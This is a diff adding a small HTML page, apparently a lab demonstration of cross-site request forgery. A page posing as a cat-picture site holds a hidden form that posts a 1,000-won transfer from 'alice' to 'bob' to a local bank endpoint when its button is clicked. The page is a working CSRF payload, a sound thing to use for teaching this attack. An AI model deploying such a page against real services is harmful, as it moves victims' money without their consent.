@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Amazing Cat Pictures!</title>
+  </head>
+  <body>
+    <h1>고양이 사진을 보러 오신 것을 환영합니다!</h1>
+
+    <!-- 숨겨진 폼 - 자동으로 alice의 1000원을 bob에게 전송 -->
+    <form
+      id="transferForm"
+      action="http://localhost:8000/bank/transfer"
+      method="POST"
+    >
+      <input type="hidden" name="from_user" value="alice" />
+      <input type="hidden" name="to_user" value="bob" />
+      <input type="hidden" name="amount" value="1000" pattern="\d+" />
+    </form>
+
+    <button id="transferButton">전송</button>
+
+    <p>잠시만 기다려주세요. 고양이 사진을 불러오고 있습니다...</p>
+
+    <script>
+      document
+        .getElementById("transferButton")
+        .addEventListener("click", function (event) {
+          event.preventDefault();
+          document.getElementById("transferForm").submit();
+        });
+    </script>
+  </body>
+</html>
